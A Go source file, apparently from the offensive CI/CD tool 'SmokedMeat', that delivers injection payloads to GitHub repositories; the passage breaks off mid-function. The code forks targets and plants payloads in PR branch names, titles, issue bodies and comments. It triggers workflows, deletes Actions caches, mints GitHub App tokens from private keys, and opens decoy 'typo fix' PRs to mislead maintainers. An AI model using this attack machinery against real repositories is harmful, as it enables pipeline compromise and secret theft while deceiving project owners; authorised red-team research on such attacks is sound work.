// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package kitchen

import (
	"context"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/google/go-github/v59/github"
	"github.com/lestrrat-go/jwx/v3/jwa"
	"github.com/lestrrat-go/jwx/v3/jwk"
	"github.com/lestrrat-go/jwx/v3/jwt"
	"golang.org/x/oauth2"

	"github.com/boostsecurityio/smokedmeat/internal/buildinfo"
	"github.com/boostsecurityio/smokedmeat/internal/lotp"
	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
)

type gitHubClient struct {
	client     *github.Client
	token      string
	graphqlURL string
}

type actionsCachesResponse struct {
	TotalCount    int                 `json:"total_count"`
	ActionsCaches []actionsCacheEntry `json:"actions_caches"`
}

type actionsCacheEntry struct {
	ID        int64     `json:"id"`
	Key       string    `json:"key"`
	Ref       string    `json:"ref"`
	Version   string    `json:"version"`
	CreatedAt time.Time `json:"created_at"`
}

const (
	issueCommentRetryAttempts = 6
	issueCommentRetryDelay    = 500 * time.Millisecond
	gitHubExploitUserAgentID  = "smokedmeat-kitchen-exploit"
)

var newGitHubClientFunc = newGitHubClientDefault

func newGitHubClient(token string) *gitHubClient {
	return newGitHubClientFunc(token)
}

func newGitHubDeployClient(token string) *gitHubClient {
	return withGitHubExploitUserAgent(newGitHubClientFunc(token))
}

func newGitHubClientDefault(token string) *gitHubClient {
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: token})
	tc := oauth2.NewClient(context.Background(), ts)
	return &gitHubClient{
		client:     github.NewClient(tc),
		token:      token,
		graphqlURL: "https://api.github.com/graphql",
	}
}

func gitHubExploitUserAgent() string {
	version := strings.TrimSpace(buildinfo.Version)
	if buildinfo.IsDevVersion() {
		version = "dev"
	}
	return gitHubExploitUserAgentID + "/" + version
}

type gitHubExploitUserAgentTransport struct {
	base      http.RoundTripper
	userAgent string
}

func (t *gitHubExploitUserAgentTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	base := t.base
	if base == nil {
		base = http.DefaultTransport
	}
	if req == nil || !shouldFlagGitHubExploitMethod(req.Method) {
		return base.RoundTrip(req)
	}
	req = req.Clone(req.Context())
	req.Header.Set("User-Agent", t.userAgent)
	return base.RoundTrip(req)
}

func shouldFlagGitHubExploitMethod(method string) bool {
	switch method {
	case http.MethodPost, http.MethodPut, http.MethodPatch, http.MethodDelete:
		return true
	default:
		return false
	}
}

func withGitHubExploitUserAgent(client *gitHubClient) *gitHubClient {
	if client == nil || client.client == nil {
		return client
	}

	httpClient := client.client.Client()
	httpClient.Transport = &gitHubExploitUserAgentTransport{
		base:      httpClient.Transport,
		userAgent: gitHubExploitUserAgent(),
	}

	gh := github.NewClient(httpClient)
	gh.BaseURL = client.client.BaseURL
	gh.UploadURL = client.client.UploadURL
	gh.UserAgent = client.client.UserAgent

	return &gitHubClient{
		client:     gh,
		token:      client.token,
		graphqlURL: client.graphqlURL,
	}
}

// RepoInfo holds repository metadata from GitHub API.
type RepoInfo struct {
	FullName  string `json:"full_name"`
	IsPrivate bool   `json:"is_private"`
	CanPush   bool   `json:"can_push"`
}

// VulnerabilityInfo describes a vulnerability target for deployment.
type VulnerabilityInfo struct {
	Repository   string   `json:"repository"`
	Workflow     string   `json:"workflow"`
	Context      string   `json:"context"`
	ID           string   `json:"id"`
	IssueNumber  int      `json:"issue_number,omitempty"`
	GateTriggers []string `json:"gate_triggers,omitempty"`
	GateRaw      string   `json:"gate_raw,omitempty"`
}

// --- Request / Response types ---

type DeployPRRequest struct {
	Token     string            `json:"token"`
	Vuln      VulnerabilityInfo `json:"vuln"`
	Payload   string            `json:"payload"`
	StagerID  string            `json:"stager_id,omitempty"`
	Draft     *bool             `json:"draft,omitempty"`
	AutoClose *bool             `json:"auto_close,omitempty"`
}

type DeployPRResponse struct {
	PRURL string `json:"pr_url"`
}

type DeployIssueRequest struct {
	Token       string            `json:"token"`
	Vuln        VulnerabilityInfo `json:"vuln"`
	Payload     string            `json:"payload"`
	CommentMode bool              `json:"comment_mode,omitempty"`
	StagerID    string            `json:"stager_id,omitempty"`
	AutoClose   *bool             `json:"auto_close,omitempty"`
}

type DeployIssueResponse struct {
	IssueURL string `json:"issue_url"`
}

type DeployCommentRequest struct {
	Token     string            `json:"token"`
	Vuln      VulnerabilityInfo `json:"vuln"`
	Payload   string            `json:"payload"`
	Target    string            `json:"target,omitempty"`
	StagerID  string            `json:"stager_id,omitempty"`
	AutoClose *bool             `json:"auto_close,omitempty"`
}

type DeployCommentResponse struct {
	CommentURL string `json:"comment_url"`
}

type DeployLOTPRequest struct {
	Token       string            `json:"token"`
	RepoName    string            `json:"repo_name"`
	Vuln        VulnerabilityInfo `json:"vuln,omitempty"`
	StagerID    string            `json:"stager_id"`
	LOTPTool    string            `json:"lotp_tool,omitempty"`
	LOTPAction  string            `json:"lotp_action,omitempty"`
	LOTPTargets []string          `json:"lotp_targets,omitempty"`
	CallbackURL string            `json:"callback_url,omitempty"`
	Draft       *bool             `json:"draft,omitempty"`
}

type DeployLOTPResponse struct {
	PRURL string `json:"pr_url"`
}

type DeployDispatchRequest struct {
	Token        string                 `json:"token"`
	Owner        string                 `json:"owner"`
	Repo         string                 `json:"repo"`
	WorkflowFile string                 `json:"workflow_file"`
	Ref          string                 `json:"ref"`
	Inputs       map[string]interface{} `json:"inputs,omitempty"`
}

type ListReposRequest struct {
	Token string `json:"token"`
}

type ListReposResponse struct {
	Repos []string `json:"repos"`
}

type ListReposWithInfoRequest struct {
	Token string `json:"token"`
}

type ListReposWithInfoResponse struct {
	Repos []RepoInfo `json:"repos"`
}

type ListWorkflowsRequest struct {
	Token string `json:"token"`
	Owner string `json:"owner"`
	Repo  string `json:"repo"`
}

type ListWorkflowsResponse struct {
	Workflows []string `json:"workflows"`
}

type GetUserRequest struct {
	Token string `json:"token"`
}

type GetUserResponse struct {
	Login  string   `json:"login"`
	Scopes []string `json:"scopes,omitempty"`
}

type FetchTokenInfoRequest struct {
	Token  string `json:"token"`
	Source string `json:"source"`
}

type FetchTokenInfoResponse struct {
	Owner        string   `json:"owner"`
	Scopes       []string `json:"scopes,omitempty"`
	RateLimitMax int      `json:"rate_limit_max,omitempty"`
	TokenType    string   `json:"token_type"`
	StatusCode   int      `json:"status_code"`
}

type gitHubErrorResponse struct {
	Error string `json:"error"`
}

// --- GitHub App types ---

type AppInstallation struct {
	ID      int64  `json:"id"`
	Account string `json:"account"`
	AppSlug string `json:"app_slug"`
}

type ListAppInstallationsRequest struct {
	PEM   string `json:"pem"`
	AppID string `json:"app_id"`
}

type ListAppInstallationsResponse struct {
	Installations []AppInstallation `json:"installations"`
}

type CreateInstallationTokenRequest struct {
	PEM            string `json:"pem"`
	AppID          string `json:"app_id"`
	InstallationID int64  `json:"installation_id"`
}

type CreateInstallationTokenResponse struct {
	Token       string            `json:"token"`
	ExpiresAt   time.Time         `json:"expires_at"`
	Permissions map[string]string `json:"permissions,omitempty"`
}

var gitHubAppAPIURL = "https://api.github.com"

func generateAppJWT(pemData []byte, appID string) (string, error) {
	block, _ := pem.Decode(pemData)
	if block == nil {
		return "", fmt.Errorf("failed to decode PEM block")
	}

	var privKey *rsa.PrivateKey
	if pk, err := x509.ParsePKCS1PrivateKey(block.Bytes); err == nil {
		privKey = pk
	} else if pkAny, err2 := x509.ParsePKCS8PrivateKey(block.Bytes); err2 == nil {
		if rsaKey, ok := pkAny.(*rsa.PrivateKey); ok {
			privKey = rsaKey
		} else {
			return "", fmt.Errorf("PKCS8 key is not RSA")
		}
	} else {
		return "", fmt.Errorf("failed to parse private key (tried PKCS1 and PKCS8): %w", err)
	}

	key, err := jwk.Import(privKey)
	if err != nil {
		return "", fmt.Errorf("failed to import JWK: %w", err)
	}

	now := time.Now()
	tok, err := jwt.NewBuilder().
		Issuer(appID).
		IssuedAt(now.Add(-60 * time.Second)).
		Expiration(now.Add(10 * time.Minute)).
		Build()
	if err != nil {
		return "", fmt.Errorf("failed to build JWT: %w", err)
	}

	signed, err := jwt.Sign(tok, jwt.WithKey(jwa.RS256(), key))
	if err != nil {
		return "", fmt.Errorf("failed to sign JWT: %w", err)
	}

	return string(signed), nil
}

func listAppInstallations(ctx context.Context, jwtToken string) ([]AppInstallation, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", gitHubAppAPIURL+"/app/installations?per_page=100", http.NoBody)
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+jwtToken)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("list installations: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GitHub API returned %d", resp.StatusCode)
	}

	var raw []struct {
		ID      int64 `json:"id"`
		Account struct {
			Login string `json:"login"`
		} `json:"account"`
		AppSlug string `json:"app_slug"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&raw); err != nil {
		return nil, fmt.Errorf("decode installations: %w", err)
	}

	var installations []AppInstallation
	for _, r := range raw {
		installations = append(installations, AppInstallation{
			ID:      r.ID,
			Account: r.Account.Login,
			AppSlug: r.AppSlug,
		})
	}
	return installations, nil
}

func createInstallationToken(ctx context.Context, jwtToken string, installationID int64) (token string, expiresAt time.Time, permissions map[string]string, err error) {
	apiURL := fmt.Sprintf("%s/app/installations/%d/access_tokens", gitHubAppAPIURL, installationID)
	req, err := http.NewRequestWithContext(ctx, "POST", apiURL, http.NoBody)
	if err != nil {
		return "", time.Time{}, nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+jwtToken)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", time.Time{}, nil, fmt.Errorf("create installation token: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		return "", time.Time{}, nil, fmt.Errorf("GitHub API returned %d", resp.StatusCode)
	}

	var result struct {
		Token       string            `json:"token"`
		ExpiresAt   time.Time         `json:"expires_at"`
		Permissions map[string]string `json:"permissions"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", time.Time{}, nil, fmt.Errorf("decode token response: %w", err)
	}

	return result.Token, result.ExpiresAt, result.Permissions, nil
}

// --- GitHub client methods (moved from counter/github.go) ---

func (c *gitHubClient) deployVulnerability(ctx context.Context, vuln *VulnerabilityInfo, payload string, draft bool) (string, error) {
	ctx, cancel := context.WithTimeout(ctx, 2*time.Minute)
	defer cancel()

	owner, repo, err := parseRepoFullName(vuln.Repository)
	if err != nil {
		return "", fmt.Errorf("invalid repository: %w", err)
	}

	user, _, err := c.client.Users.Get(ctx, "")
	if err != nil {
		return "", fmt.Errorf("failed to get authenticated user: %w", err)
	}
	username := user.GetLogin()

	forkOwner := username
	forkRepo := repo

	_, _, err = c.client.Repositories.Get(ctx, forkOwner, forkRepo)
	if err != nil {
		fork, _, forkErr := c.client.Repositories.CreateFork(ctx, owner, repo, &github.RepositoryCreateForkOptions{})
		if forkErr != nil {
			var acceptedErr *github.AcceptedError
			if !errors.As(forkErr, &acceptedErr) {
				return "", fmt.Errorf("failed to fork repository: %w", forkErr)
			}
		}
		if fork != nil {
			forkOwner = fork.GetOwner().GetLogin()
			forkRepo = fork.GetName()
		}

		for i := 0; i < 30; i++ {
			time.Sleep(2 * time.Second)
			_, _, err = c.client.Repositories.Get(ctx, forkOwner, forkRepo)
			if err == nil {
				break
			}
		}
	}

	defaultBranch, err := c.getDefaultBranch(ctx, owner, repo)
	if err != nil {
		return "", fmt.Errorf("failed to get default branch: %w", err)
	}

	var branchName string
	if vuln.Context == "git_branch" {
		branchName = payload
	} else {
		branchName = fmt.Sprintf("smokedmeat-%d", time.Now().Unix())
	}

	err = c.createBranch(ctx, forkOwner, forkRepo, defaultBranch, branchName)
	if err != nil {
		return "", fmt.Errorf("failed to create branch: %w", err)
	}

	prTitle, prBody := buildPRContent(vuln, payload)

	err = c.createCommit(ctx, forkOwner, forkRepo, branchName, prTitle, vuln)
	if err != nil {
		return "", fmt.Errorf("failed to create commit: %w", err)
	}

	pr, _, err := c.client.PullRequests.Create(ctx, owner, repo, &github.NewPullRequest{
		Title:               github.String(prTitle),
		Body:                github.String(prBody),
		Head:                github.String(fmt.Sprintf("%s:%s", forkOwner, branchName)),
		Base:                github.String(defaultBranch),
		MaintainerCanModify: github.Bool(true),
		Draft:               github.Bool(draft),
	})
	if err != nil {
		return "", fmt.Errorf("failed to create pull request: %w", err)
	}

	return pr.GetHTMLURL(), nil
}

func (c *gitHubClient) getDefaultBranch(ctx context.Context, owner, repo string) (string, error) {
	repository, _, err := c.client.Repositories.Get(ctx, owner, repo)
	if err != nil {
		return "", err
	}
	return repository.GetDefaultBranch(), nil
}

func (c *gitHubClient) listActionsCaches(ctx context.Context, owner, repo string) ([]actionsCacheEntry, error) {
	var caches []actionsCacheEntry
	page := 1

	for {
		req, err := c.client.NewRequest(http.MethodGet, fmt.Sprintf("repos/%s/%s/actions/caches?per_page=100&page=%d",
			url.PathEscape(owner), url.PathEscape(repo), page), nil)
		if err != nil {
			return nil, fmt.Errorf("failed to build actions cache list request: %w", err)
		}

		var respBody actionsCachesResponse
		resp, err := c.client.Do(ctx, req, &respBody)
		if err != nil {
			return nil, fmt.Errorf("failed to list actions caches: %w", err)
		}

		caches = append(caches, respBody.ActionsCaches...)
		if resp.NextPage == 0 {
			break
		}
		page = resp.NextPage
	}

	return caches, nil
}

func (c *gitHubClient) deleteActionsCache(ctx context.Context, owner, repo string, cacheID int64) error {
	req, err := c.client.NewRequest(http.MethodDelete, fmt.Sprintf("repos/%s/%s/actions/caches/%d",
		url.PathEscape(owner), url.PathEscape(repo), cacheID), nil)
	if err != nil {
		return fmt.Errorf("failed to build actions cache delete request: %w", err)
	}

	resp, err := c.client.BareDo(ctx, req)
	if resp != nil && resp.Body != nil {
		defer resp.Body.Close()
	}
	if err != nil {
		return fmt.Errorf("failed to delete actions cache %d: %w", cacheID, err)
	}
	return nil
}

func (c *gitHubClient) purgeActionsCaches(ctx context.Context, repository, key, keyPrefix, ref string) (effectiveRef string, deleted int, err error) {
	owner, repo, err := parseRepoFullName(repository)
	if err != nil {
		return "", 0, fmt.Errorf("invalid repository: %w", err)
	}
	key = strings.TrimSpace(key)
	keyPrefix = strings.TrimSpace(keyPrefix)
	if key == "" && keyPrefix == "" {
		return "", 0, fmt.Errorf("cache key or prefix is required")
	}

	effectiveRef = strings.TrimSpace(ref)
	if effectiveRef == "" {
		defaultBranch, branchErr := c.getDefaultBranch(ctx, owner, repo)
		if branchErr != nil {
			return "", 0, fmt.Errorf("failed to resolve default branch: %w", branchErr)
		}
		effectiveRef = "refs/heads/" + defaultBranch
	}

	caches, err := c.listActionsCaches(ctx, owner, repo)
	if err != nil {
		return "", 0, err
	}

	for _, cache := range caches {
		if key != "" {
			if cache.Key != key {
				continue
			}
		} else {
			if !strings.HasPrefix(cache.Key, keyPrefix) {
				continue
			}
		}
		if cache.Ref != effectiveRef {
			continue
		}
		if err := c.deleteActionsCache(ctx, owner, repo, cache.ID); err != nil {
			return "", deleted, err
		}
		deleted++
	}

	return effectiveRef, deleted, nil
}

func (c *gitHubClient) createBranch(ctx context.Context, owner, repo, baseBranch, newBranch string) error {
	ref, _, err := c.client.Git.GetRef(ctx, owner, repo, "refs/heads/"+baseBranch)
	if err != nil {
		return fmt.Errorf("failed to get base branch ref: %w", err)
	}

	_, _, err = c.client.Git.CreateRef(ctx, owner, repo, &github.Reference{
		Ref:    github.String("refs/heads/" + newBranch),
		Object: &github.GitObject{SHA: ref.Object.SHA},
	})
	if err != nil {
		return fmt.Errorf("failed to create branch ref: %w", err)
	}

	return nil
}

func (c *gitHubClient) createCommit(ctx context.Context, owner, repo, branch, message string, vuln *VulnerabilityInfo) error {
	var filename, content string

	switch vuln.Context {
	case "pr_title", "pr_body":
		filename = ".smokedmeat"
		content = fmt.Sprintf("# SmokedMeat marker\nTimestamp: %d\n", time.Now().Unix())
	default:
		filename = ".github/smokedmeat-test.txt"
		content = fmt.Sprintf("# SmokedMeat Test\nWorkflow: %s\nContext: %s\n", vuln.Workflow, vuln.Context)
	}

	opts := &github.RepositoryContentFileOptions{
		Message: github.String(message),
		Content: []byte(content),
		Branch:  github.String(branch),
	}

	_, _, err := c.client.Repositories.CreateFile(ctx, owner, repo, filename, opts)
	return err
}

func (c *gitHubClient) listAccessibleRepos(ctx context.Context) ([]string, error) {
	var repos []string
	opt := &github.RepositoryListByAuthenticatedUserOptions{
		ListOptions: github.ListOptions{PerPage: 100},
	}

	for {
		list, resp, err := c.client.Repositories.ListByAuthenticatedUser(ctx, opt)
		if err != nil {
			return nil, fmt.Errorf("failed to list repositories: %w", err)
		}

		for _, r := range list {
			repos = append(repos, r.GetFullName())
		}

		if resp.NextPage == 0 {
			break
		}
		opt.Page = resp.NextPage
	}

	return repos, nil
}

func (c *gitHubClient) getAuthenticatedUser(ctx context.Context) (string, *github.Response, error) {
	user, resp, err := c.client.Users.Get(ctx, "")
	if err != nil {
		return "", resp, err
	}
	return user.GetLogin(), resp, nil
}

func (c *gitHubClient) listAccessibleReposWithInfo(ctx context.Context) ([]RepoInfo, error) {
	var repos []RepoInfo
	opt := &github.RepositoryListByAuthenticatedUserOptions{
		ListOptions: github.ListOptions{PerPage: 100},
	}

	for {
		list, resp, err := c.client.Repositories.ListByAuthenticatedUser(ctx, opt)
		if err != nil {
			return nil, fmt.Errorf("failed to list repositories: %w", err)
		}

		for _, r := range list {
			repos = append(repos, RepoInfo{
				FullName:  r.GetFullName(),
				IsPrivate: r.GetPrivate(),
				CanPush:   r.GetPermissions()["push"],
			})
		}

		if resp.NextPage == 0 {
			break
		}
		opt.Page = resp.NextPage
	}

	return repos, nil
}

func viewerPermissionCanPush(permission string) bool {
	switch strings.ToUpper(strings.TrimSpace(permission)) {
	case "ADMIN", "MAINTAIN", "WRITE":
		return true
	default:
		return false
	}
}

func (c *gitHubClient) listOwnerReposWithInfoGraphQL(ctx context.Context, owner string) ([]RepoInfo, error) {
	const query = `query OwnerReposWithInfo($login: String!, $cursor: String) {
  repositoryOwner(login: $login) {
    repositories(first: 100, after: $cursor) {
      pageInfo {
        hasNextPage
        endCursor
      }
      nodes {
        nameWithOwner
        isPrivate
        viewerPermission
      }
    }
  }
}`

	var repos []RepoInfo
	var cursor *string

	for {
		var data struct {
			RepositoryOwner *struct {
				Repositories struct {
					PageInfo struct {
						HasNextPage bool   `json:"hasNextPage"`
						EndCursor   string `json:"endCursor"`
					} `json:"pageInfo"`
					Nodes []struct {
						NameWithOwner    string `json:"nameWithOwner"`
						IsPrivate        bool   `json:"isPrivate"`
						ViewerPermission string `json:"viewerPermission"`
					} `json:"nodes"`
				} `json:"repositories"`
			} `json:"repositoryOwner"`
		}

		variables := map[string]interface{}{
			"login":  owner,
			"cursor": cursor,
		}
		gqlErrors, err := c.executeGraphQL(ctx, query, variables, &data)
		if err != nil {
			return nil, err
		}
		if len(gqlErrors) > 0 {
			return nil, errors.New(gqlErrors[0].Message)
		}
		if data.RepositoryOwner == nil {
			return nil, fmt.Errorf("repository owner not found")
		}

		for _, node := range data.RepositoryOwner.Repositories.Nodes {
			if node.NameWithOwner == "" {
				continue
			}
			repos = append(repos, RepoInfo{
				FullName:  node.NameWithOwner,
				IsPrivate: node.IsPrivate,
				CanPush:   viewerPermissionCanPush(node.ViewerPermission),
			})
		}

		if !data.RepositoryOwner.Repositories.PageInfo.HasNextPage || data.RepositoryOwner.Repositories.PageInfo.EndCursor == "" {
			break
		}
		nextCursor := data.RepositoryOwner.Repositories.PageInfo.EndCursor
		cursor = &nextCursor
	}

	return repos, nil
}

func (c *gitHubClient) getRepoInfo(ctx context.Context, owner, repo string) (RepoInfo, error) {
	r, _, err := c.client.Repositories.Get(ctx, owner, repo)
	if err != nil {
		return RepoInfo{}, err
	}
	return RepoInfo{
		FullName:  r.GetFullName(),
		IsPrivate: r.GetPrivate(),
		CanPush:   r.GetPermissions()["push"],
	}, nil
}

func (c *gitHubClient) getWorkflowByFileName(ctx context.Context, owner, repo, filename string) error {
	_, _, err := c.client.Actions.GetWorkflowByFileName(ctx, owner, repo, filename)
	return err
}

func (c *gitHubClient) triggerWorkflowDispatch(ctx context.Context, owner, repo, workflowFile, ref string, inputs map[string]interface{}) error {
	req := github.CreateWorkflowDispatchEventRequest{
		Ref: ref,
	}
	if len(inputs) > 0 {
		req.Inputs = inputs
	}
	_, err := c.client.Actions.CreateWorkflowDispatchEventByFileName(ctx, owner, repo, workflowFile, req)
	return err
}

func (c *gitHubClient) createIssue(ctx context.Context, owner, repo, title, body string) (*github.Issue, error) {
	issue, _, err := c.client.Issues.Create(ctx, owner, repo, &github.IssueRequest{
		Title: github.String(title),
		Body:  github.String(body),
	})
	return issue, err
}

func (c *gitHubClient) createIssueComment(ctx context.Context, owner, repo string, issueNumber int, body string) error {
	var err error
	for attempt := 0; attempt < issueCommentRetryAttempts; attempt++ {
		_, _, err = c.client.Issues.CreateComment(ctx, owner, repo, issueNumber, &github.IssueComment{
			Body: github.String(body),
		})
		if err == nil || !isRetryableIssueCommentError(err) || attempt == issueCommentRetryAttempts-1 {
			return err
		}

		timer := time.NewTimer(issueCommentRetryDelay)
		select {
		case <-ctx.Done():
			timer.Stop()
			return ctx.Err()
		case <-timer.C:
		}
	}
	return err
}

func (c *gitHubClient) closeIssue(ctx context.Context, owner, repo string, issueNumber int) error {
	state := "closed"
	_, _, err := c.client.Issues.Edit(ctx, owner, repo, issueNumber, &github.IssueRequest{State: &state})
	return err
}

func isRetryableIssueCommentError(err error) bool {
	if err == nil {
		return false
	}

	var ghErr *github.ErrorResponse
	if !errors.As(err, &ghErr) {
		return false
	}

	if ghErr.Response == nil || ghErr.Response.StatusCode != http.StatusUnprocessableEntity {
		return false
	}

	return strings.Contains(err.Error(), "Could not resolve to a node with the global id of")
}

func (c *gitHubClient) listWorkflowsWithDispatch(ctx context.Context, owner, repo string) ([]string, error) {
	workflows, _, err := c.client.Actions.ListWorkflows(ctx, owner, repo, &github.ListOptions{PerPage: 100})
	if err != nil {
		return nil, err
	}

	var dispatchable []string
	for _, wf := range workflows.Workflows {
		content, _, _, err := c.client.Repositories.GetContents(ctx, owner, repo, wf.GetPath(), nil)
		if err != nil {
			continue
		}

		decoded, err := content.GetContent()
		if err != nil {
			continue
		}

		if strings.Contains(decoded, "workflow_dispatch") {
			dispatchable = append(dispatchable, wf.GetPath())
		}
	}

	return dispatchable, nil
}

func (c *gitHubClient) deployIssue(ctx context.Context, vuln *VulnerabilityInfo, payload string, commentMode bool) (string, error) {
	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	owner, repo, err := parseRepoFullName(vuln.Repository)
	if err != nil {
		return "", fmt.Errorf("invalid repository: %w", err)
	}

	if commentMode {
		return c.deployIssueCommentMode(ctx, owner, repo, vuln, payload)
	}

	var issueTitle, issueBody string
	switch vuln.Context {
	case "issue_title":
		issueTitle = payload
		issueBody = fmt.Sprintf(`CI workflow security test.

Workflow: %s
Context: Issue title injection

_Generated by SmokedMeat_`, vuln.Workflow)

	case "issue_body":
		issueTitle = "test: CI workflow validation"
		issueBody = payload

	default:
		issueTitle = fmt.Sprintf("test: CI workflow validation (%s)", vuln.Context)
		issueBody = payload
	}

	issue, err := c.createIssue(ctx, owner, repo, issueTitle, issueBody)
	if err != nil {
		return "", fmt.Errorf("failed to create issue: %w", err)
	}

	return issue.GetHTMLURL(), nil
}

func (c *gitHubClient) deployIssueCommentMode(ctx context.Context, owner, repo string, vuln *VulnerabilityInfo, payload string) (string, error) {
	issueTitle := "test: CI workflow validation"
	issueBody := fmt.Sprintf(`CI workflow security test.

Workflow: %s
Context: %s (comment trigger)

_Generated by SmokedMeat_`, vuln.Workflow, vuln.Context)

	issue, err := c.createIssue(ctx, owner, repo, issueTitle, issueBody)
	if err != nil {
		return "", fmt.Errorf("failed to create issue: %w", err)
	}

	err = c.createIssueComment(ctx, owner, repo, issue.GetNumber(), payload)
	if err != nil {
		if closeErr := c.closeIssue(ctx, owner, repo, issue.GetNumber()); closeErr != nil {
			return "", fmt.Errorf("failed to add comment to issue: %w (cleanup failed: %v)", err, closeErr)
		}
		return "", fmt.Errorf("failed to add comment to issue: %w", err)
	}

	return issue.GetHTMLURL(), nil
}

type deployCommentResult struct {
	CommentURL      string
	CreatedIssueURL string
	CreatedPRURL    string
}

func (c *gitHubClient) deployComment(ctx context.Context, vuln *VulnerabilityInfo, payload, target string) (*deployCommentResult, error) {
	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	owner, repo, err := parseRepoFullName(vuln.Repository)
	if err != nil {
		return nil, fmt.Errorf("invalid repository: %w", err)
	}

	var targetIssueNumber int
	var createdIssueURL string
	var createdPRURL string
	isPRTarget := target == "pull_request" || target == "stub_pull_request"

	switch {
	case vuln.IssueNumber > 0:
		targetIssueNumber = vuln.IssueNumber
	case target == "stub_pull_request":
		var pr *github.PullRequest
		pr, err = c.createCommentStubPR(ctx, owner, repo)
		if err != nil {
			return nil, fmt.Errorf("failed to create stub PR: %w", err)
		}
		targetIssueNumber = pr.GetNumber()
		createdPRURL = pr.GetHTMLURL()
	default:
		if target == "pull_request" {
			return nil, fmt.Errorf("PR number is required")
		}
		var issues []*github.Issue
		issues, _, err = c.client.Issues.ListByRepo(ctx, owner, repo, &github.IssueListByRepoOptions{
			State:       "open",
			ListOptions: github.ListOptions{PerPage: 10},
		})
		if err != nil {
			return nil, fmt.Errorf("failed to list issues: %w", err)
		}

		var targetIssue *github.Issue
		for _, issue := range issues {
			if issue.PullRequestLinks == nil {
				targetIssue = issue
				break
			}
		}

		if targetIssue == nil {
			issueTitle := "test: CI workflow validation"
			issueBody := fmt.Sprintf(`CI workflow security test.

Workflow: %s

_Generated by SmokedMeat_`, vuln.Workflow)

			targetIssue, err = c.createIssue(ctx, owner, repo, issueTitle, issueBody)
			if err != nil {
				return nil, fmt.Errorf("failed to create issue for comment: %w", err)
			}
			createdIssueURL = targetIssue.GetHTMLURL()
		}
		targetIssueNumber = targetIssue.GetNumber()
	}

	err = c.createIssueComment(ctx, owner, repo, targetIssueNumber, payload)
	if err != nil {
		if createdIssueURL != "" {
			if closeErr := c.closeIssue(ctx, owner, repo, targetIssueNumber); closeErr != nil {
				return nil, fmt.Errorf("failed to create comment: %w (cleanup failed: %v)", err, closeErr)
			}
		}
		if createdPRURL != "" {
			if closeErr := closePRByURL(ctx, c.token, createdPRURL); closeErr != nil {
				return nil, fmt.Errorf("failed to create comment: %w (cleanup failed: %v)", err, closeErr)
			}
		}
		return nil, fmt.Errorf("failed to create comment: %w", err)
	}

	commentURL := fmt.Sprintf("https://github.com/%s/%s/issues/%d#issuecomment-latest", owner, repo, targetIssueNumber)
	if isPRTarget {
		commentURL = fmt.Sprintf("https://github.com/%s/%s/pull/%d#issuecomment-latest", owner, repo, targetIssueNumber)
	}
	return &deployCommentResult{
		CommentURL:      commentURL,
		CreatedIssueURL: createdIssueURL,
		CreatedPRURL:    createdPRURL,
	}, nil
}

func (c *gitHubClient) createCommentStubPR(ctx context.Context, owner, repo string) (*github.PullRequest, error) {
	defaultBranch, err := c.getDefaultBranch(ctx, owner, repo)
	if err != nil {
		return nil, fmt.Errorf("failed to get default branch: %w", err)
	}

	branchName := fmt.Sprintf("smokedmeat-typo-fix-%d", time.Now().Unix())
	err = c.createBranch(ctx, owner, repo, defaultBranch, branchName)
	if err != nil {
		return nil, fmt.Errorf("failed to create branch: %w", err)
	}
	err = c.createCommentStubCommit(ctx, owner, repo, branchName)
	if err != nil {
		return nil, fmt.Errorf("failed to create typo-fix commit: %w", err)
	}

	pr, _, err := c.client.PullRequests.Create(ctx, owner, repo, &github.NewPullRequest{
		Title:               github.String("docs: typo fix"),
		Body:                github.String("Routine typo cleanup."),
		Head:                github.String(branchName),
		Base:                github.String(defaultBranch),
		MaintainerCanModify: github.Bool(true),
	})
	if err != nil {
		return nil, fmt.Errorf("failed to create pull request: %w", err)
	}
	return pr, nil
}

func (c *gitHubClient) createCommentStubCommit(ctx context.Context, owner, repo, branch string) error {
	filename := fmt.Sprintf(".github/smokedmeat-typo-fix-%d.md", time.Now().Unix())
	opts := &github.RepositoryContentFileOptions{
		Message: github.String("docs: typo fix"),
		Content: []byte("routine typo cleanup marker\n"),
		Branch:  github.String(branch),
	}
	_, _, err := c.client.Repositories.CreateFile(ctx, owner, repo, filename, opts)
	return err
}

func (c *gitHubClient) deployLOTP(ctx context.Context, vuln *VulnerabilityInfo, repoFullName, kitchenURL, stagerID, lotpTool string, lotpTargets []string, draft bool) (string, error) {
	ctx, cancel := context.WithTimeout(ctx, 2*time.Minute)
	defer cancel()

	owner, repo, err := parseRepoFullName(repoFullName)
	if err != nil {
		return "", fmt.Errorf("invalid repository: %w", err)
	}

	user, _, err := c.client.Users.Get(ctx, "")
	if err != nil {
		return "", fmt.Errorf("failed to get authenticated user: %w", err)
	}
	username := user.GetLogin()

	forkOwner := username
	forkRepo := repo

	_, _, err = c.client.Repositories.Get(ctx, forkOwner, forkRepo)
	if err != nil {
		fork, _, forkErr := c.client.Repositories.CreateFork(ctx, owner, repo, &github.RepositoryCreateForkOptions{})
		if forkErr != nil {
			var acceptedErr *github.AcceptedError
